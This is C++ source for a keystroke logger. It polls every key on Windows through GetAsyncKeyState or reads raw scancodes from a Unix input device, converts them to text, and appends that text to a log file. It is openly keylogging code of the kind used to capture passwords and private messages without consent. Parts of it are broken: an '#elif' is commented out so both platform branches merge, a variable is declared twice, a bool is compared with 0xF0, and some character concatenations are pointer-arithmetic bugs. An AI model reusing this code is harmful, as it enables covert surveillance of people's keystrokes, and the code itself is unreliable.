#include <iostream>
#include <fstream>
#include <stdexcept>
#include "keylog.h"
#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
#include <windows.h>
#include <windowsx.h>
#define MAX_VALUE 94
#elif __unix__
#include <poll.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#include <cstring>
#define MAX_VALUE 127
#endif // macros defined by cpp (C prprocessor)

using namespace std;

vcodes& operator++(vcodes& e) {
    switch(e) {
        case vcodes::TAB:
        e = vcodes(0x0C);
        break;
        case vcodes::RETURN:
        e = vcodes(0x10);
        break;
        case vcodes::CAPITAL:
        e = vcodes(0x1B);
        break;
        case vcodes::ESCAPE:
        e = vcodes(0x20);
        break;
        case vcodes::NUM_9:
        e = vcodes(0x41);
        break;
        case vcodes::APPS:
        e = vcodes(0x5F);
        break;
        case vcodes::DIVIDE:
        e = vcodes(0xBB);
        break;
        case vcodes::OEM_3:
        e = vcodes(0xDB);
        break;
        case vcodes::OEM_8:
        e = vcodes(0xFE);
        break;
        case vcodes::REAL_END:
        throw std::out_of_range("vcodes operator++");
        default:
        e = vcodes(static_cast<std::underlying_type<vcodes>::type>(e) + 1);
    }
    return e;
} // operator++

template<typename T1, typename T2>
T2 convert(T1 x) {
    T2 v;
    switch (x) {
        case T1::BACK:
        v = T2::BACK;
        break;
        case T1::TAB:
        v = T2::TAB;
        break;
        case T1::RETURN:
        v = T2::RETURN;
        break;
        case T1::LSHIFT:
        case T1::RSHIFT:
        v = T2::SHIFT;
        break;
        case T1::LCONTROL:
        case T1::RCONTROL:
        v = T2::CONTROL;
        break;
        case T1::LALT:
        case T1::RALT:
        v = T2::MENU;
        break;
        case T1::PAUSE:
        v = T2::PAUSE;
        break;
        case T1::CAPITAL:
        v = T2::CAPITAL;
        break;
        case T1::ESCAPE:
        v = T2::ESCAPE;
        break;
        case T1::SPACE:
        v = T2::SPACE;
        break;
        case T1::END:
        v = T2::END;
        break;
        case T1::HOME:
        v = T2::HOME;
        break;
        case T1::LEFT:
        v = T2::LEFT;
        break;
        case T1::UP:
        v = T2::UP;
        break;
        case T1::RIGHT:
        v = T2::RIGHT;
        break;
        case T1::DOWN:
        v = T2::DOWN;
        break;
        case T1::PRINT:
        v = T2::PRINT;
        break;
        case T1::INSERT:
        v = T2::INSERT;
        break;
        case T1::DELETE_KEY:
        v = T2::DELETE_KEY;
        break;
        case T1::NUM_0:
        v = T2::NUM_0;
        break;
        case T1::NUM_1:
        v = T2::NUM_1;
        break;
        case T1::NUM_2:
        v = T2::NUM_2;
        break;
        case T1::NUM_3:
        v = T2::NUM_3;
        break;
        case T1::NUM_4:
        v = T2::NUM_4;
        break;
        case T1::NUM_5:
        v = T2::NUM_5;
        break;
        case T1::NUM_6:
        v = T2::NUM_6;
        break;
        case T1::NUM_7:
        v = T2::NUM_7;
        break;
        case T1::NUM_8:
        v = T2::NUM_8;
        break;
        case T1::NUM_9:
        v = T2::NUM_9;
        break;
        case T1::A:
        v = T2::A;
        break;
        case T1::B:
        v = T2::B;
        break;
        case T1::C:
        v = T2::C;
        break;
        case T1::D:
        v = T2::D;
        break;
        case T1::E:
        v = T2::E;
        break;
        case T1::F:
        v = T2::F;
        break;
        case T1::G:
        v = T2::G;
        break;
        case T1::H:
        v = T2::H;
        break;
        case T1::I:
        v = T2::I;
        break;
        case T1::J:
        v = T2::J;
        break;
        case T1::K:
        v = T2::K;
        break;
        case T1::L:
        v = T2::L;
        break;
        case T1::M:
        v = T2::M;
        break;
        case T1::N:
        v = T2::N;
        break;
        case T1::O:
        v = T2::O;
        break;
        case T1::P:
        v = T2::P;
        break;
        case T1::Q:
        v = T2::Q;
        break;
        case T1::R:
        v = T2::R;
        break;
        case T1::S:
        v = T2::S;
        break;
        case T1::T:
        v = T2::T;
        break;
        case T1::U:
        v = T2::U;
        break;
        case T1::V:
        v = T2::V;
        break;
        case T1::W:
        v = T2::W;
        break;
        case T1::X:
        v = T2::X;
        break;
        case T1::Y:
        v = T2::Y;
        break;
        case T1::Z:
        v = T2::Z;
        break;
        case T1::NUMPAD0:
        v = T2::NUMPAD0;
        break;
        case T1::NUMPAD1:
        v = T2::NUMPAD1;
        break;
        case T1::NUMPAD2:
        v = T2::NUMPAD2;
        break;
        case T1::NUMPAD3:
        v = T2::NUMPAD3;
        break;
        case T1::NUMPAD4:
        v = T2::NUMPAD4;
        break;
        case T1::NUMPAD5:
        v = T2::NUMPAD5;
        break;
        case T1::NUMPAD6:
        v = T2::NUMPAD6;
        break;
        case T1::NUMPAD7:
        v = T2::NUMPAD7;
        break;
        case T1::NUMPAD8:
        v = T2::NUMPAD8;
        break;
        case T1::NUMPAD9:
        v = T2::NUMPAD9;
        break;
        case T1::MULTIPLY:
        v = T2::MULTIPLY;
        break;
        case T1::ADD:
        v = T2::ADD;
        break;
        case T1::SEPARATOR:
        v = T2::SEPARATOR;
        break;
        case T1::SUBTRACT:
        v = T2::SUBTRACT;
        break;
        case T1::DECIMAL:
        v = T2::DECIMAL;
        break;
        case T1::DIVIDE:
        v = T2::DIVIDE;
        break;
        case T1::OEM_1:
        v = T2::OEM_1;
        break;
        case T1::OEM_PLUS:
        v = T2::OEM_PLUS;
        break;
        case T1::OEM_COMMA:
        v = T2::OEM_COMMA;
        break;
        case T1::OEM_MINUS:
        v = T2::OEM_MINUS;
        break;
        case T1::OEM_PERIOD:
        v = T2::OEM_PERIOD;
        break;
        case T1::OEM_2:
        v = T2::OEM_2;
        break;
        case T1::OEM_3:
        v = T2::OEM_3;
        break;
        case T1::OEM_4:
        v = T2::OEM_4;
        break;
        case T1::OEM_5:
        v = T2::OEM_5;
        break;
        case T1::OEM_6:
        v = T2::OEM_6;
        break;
        case T1::OEM_7:
        v = T2::OEM_7;
        break;
        case T1::OEM_8:
        v = T2::OEM_8;
        break;
        default:
        throw invalid_argument("Not a known member.");
    } // switch
    return v;
}

vector<vcodes> getPressedKeyboardState(string path) {
    vector<vcodes> pressed;
    static bool ar[MAX_VALUE];
    static bool capsLoc = false;
    #if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    int x = 0;
    for (vcodes v = vcodes::BACK; v != vcodes::REAL_END; ++v) {
        bool p = (GetAsyncKeyState((int)v) & 0x8000);
        if (v == vcodes::CAPITAL) {
            if (p && !ar[x]) {
                capsLoc = !capsLoc;
                ar[x] = true;
            } else if (!p) {
                ar[x] = false;
            }
            if (capsLoc) {
                pressed.push_back(v);
            }
            continue;
        }
        if (p && (!ar[x] || (v >= vcodes::SHIFT && v <= vcodes::MENU))) {
            ar[x] = true;
            pressed.push_back(v);
        } else if (!p) {
            ar[x] = false;
        }
        x++;
    }
    //#elif __unix__
    static int fd  = open(&*path.begin(), O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        cerr << "path is incorrect.\n" << endl;
        exit(1);
    }
    bool last;
    int x = 0;
	struct pollfd f[1] = {fd, POLLIN, 0};
	int t = 50000;
	unsigned char s[4096];
	memset(s, '\0', 4096);
	if (poll(f, 1, t) < 0) {
		cout << "ME" << endl;
		return pressed;
	} // if
    t = read(fd, s, sizeof(char) * 4096);
	char ch[3] = {'\0', '\0', '\0'};
	sprintf(ch, "%02X", s[20]);
	printf("%02X", s[20]);
	x = stoi(ch, nullptr, 16);
    if (x == 0xE0) {
        sprintf(ch, "%02X", s[21]);
        x = stoi(ch, nullptr, 16) + 0xE000;
    } else if (x == 0xE1) {
        x = (int)set1::PAUSE;
    }
    vcodes v;
    try {
        last = false;
	    v = convert<set1, vcodes>(set1(x));
    } catch (invalid_argument const & ex) {
        try {
            last = true;
            v = convert<set1, vcodes>(set1(x - 0x80));
        } catch (invalid_argument const & e) {
            return pressed;
        }
    }
	if (v == vcodes::CAPITAL) {
		if (!ar[0]) {
			capsLoc = !capsLoc;
			ar[0] = true;
		} else if (last == 0xF0) {
			ar[0] = false;
		}
		if (capsLoc) {
			pressed.push_back(v);
		}
	} else {
		bool l = ar[x];
		ar[x] = (last == 0xF0) ? false : true;
		if (!l && ar[x]) {
			pressed.push_back(v);
		}
	}
	cout << endl;
    #endif
    return pressed;
} // getAsyncKeyboardState

static bool contains(vector<vcodes> pr, vcodes v) {
    for (auto vc = pr.begin(); vc != pr.end(); ++vc) {
        if (*vc == v) {
            return true;
        }
    }
    return false;
}

string getAscii(vector<vcodes> pressed) {
    bool shift = contains(pressed, vcodes::SHIFT);
    bool capslock = contains(pressed, vcodes::CAPITAL);
    bool alt = contains(pressed, vcodes::MENU);
    string str;
    for(auto vc = pressed.begin(); vc != pressed.end(); ++vc) {
        if ((*vc >= vcodes::NUM_0 && *vc <= vcodes::NUM_9) || (*vc >= vcodes::NUMPAD0 && *vc <= vcodes::NUMPAD9)) {
            if (shift) {
                switch (*vc) {
                    case vcodes::NUMPAD0:
                    case vcodes::NUM_0:
                    str += ")";
                    break;
                    case vcodes::NUMPAD1:
                    case vcodes::NUM_1:
                    str += "!";
                    break;
                    case vcodes::NUMPAD2:
                    case vcodes::NUM_2:
                    str += "@";
                    break;
                    case vcodes::NUMPAD3:
                    case vcodes::NUM_3:
                    str += "#";
                    break;
                    case vcodes::NUMPAD4:
                    case vcodes::NUM_4:
                    str += "$";
                    break;
                    case vcodes::NUMPAD5:
                    case vcodes::NUM_5:
                    str += "%";
                    break;
                    case vcodes::NUMPAD6:
                    case vcodes::NUM_6:
                    str += "^";
                    break;
                    case vcodes::NUMPAD7:
                    case vcodes::NUM_7:
                    str += "&";
                    break;
                    case vcodes::NUMPAD8:
                    case vcodes::NUM_8:
                    str += "*";
                    break;
                    case vcodes::NUMPAD9:
                    case vcodes::NUM_9:
                    str += "(";
                    break;
                    default:
                    str += "";
                }
            } else {
                str += (char)*vc;
            }
        } else if (*vc >= vcodes::A && *vc <= vcodes::Z) {
            str += ((shift && !capslock) || (!shift && capslock))? (char)*vc : (char)((int)(*vc) + 32);
        } else if (*vc >= vcodes::MULTIPLY) {
            switch (*vc) {
                case vcodes::MULTIPLY:
                str += "*";
                break;
                case vcodes::OEM_1:
                str += (shift)? ":" : ";";
                break;
                case vcodes::DIVIDE:
                case vcodes::OEM_2:
                str += (shift)? "?" : "/";
                break;
                case vcodes::OEM_3:
                str += (shift)? "~" : "`";
                break;
                case vcodes::OEM_4:
                str += (shift)? "{" : "[";
                break;
                case vcodes::SEPARATOR:
                case vcodes::OEM_5:
                str += (shift)? "|" : "\\";
                break;
                case vcodes::OEM_6:
                str += (shift)? "}" : "]";
                break;
                case vcodes::OEM_7:
                str += (shift)? "\"" : "\'";
                break;
                case vcodes::OEM_8:
                str += (shift)? "" : "";
                break;
                case vcodes::OEM_COMMA:
                str += (shift)? "<" : ",";
                break;
                case vcodes::OEM_CLEAR:
                str += (shift)? "" : "";
                break;
                case vcodes::DECIMAL:
                case vcodes::OEM_PERIOD:
                str += (shift)? ">" : ".";
                break;
                case vcodes::ADD:
                case vcodes::OEM_PLUS:
                str += (shift)? "+" : "=";
                break;
                case vcodes::SUBTRACT:
                case vcodes::OEM_MINUS:
                str += (shift)? "_" : "-";
                break;
                default:
                str += "";
            }
        } else if (*vc >= vcodes::BACK && *vc <= vcodes::DELETE_KEY) {
            switch (*vc) {
                case vcodes::BACK:
                str += "\b";
                break;
                case vcodes::TAB:
                str += "\t";
                break;
                case vcodes::RETURN:
                str += "\n";
                break;
                case vcodes::ESCAPE:
                str += "" + (char)27;
                break;
                case vcodes::SPACE:
                str += " ";
                break;
                case vcodes::DELETE_KEY:
                str += "" + (char)127;
                break;
                default:
                str += "";
            }
        }
    }
    return str;
} // getAscii



void writeToFile(string file, string s) {
    static ofstream outFile{file, std::ios::app | std::ios::out};
    if (s.empty()) {
        return;
    }
    if (!outFile.is_open()) {
        cerr << "Cannot find " << file << endl;
        return;
    }
	cout << s << endl;
    outFile << s;
    outFile.flush();
} // writeToFile
